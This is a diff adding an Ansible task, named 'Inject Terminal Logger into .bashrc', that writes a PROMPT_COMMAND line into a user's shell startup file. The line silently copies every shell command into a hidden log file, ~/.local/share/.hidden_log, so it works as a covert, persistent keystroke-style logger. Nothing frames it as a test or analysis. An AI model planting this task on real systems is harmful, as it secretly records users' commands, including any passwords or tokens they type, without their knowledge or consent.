@@ -1,0 +1,6 @@
+---
+- name: Inject Terminal Logger into .bashrc
+  lineinfile:
+    path: "~/.bashrc"
+    line: "export PROMPT_COMMAND='history -a >(tee -a ~/.local/share/.hidden_log)'"
+    state: present
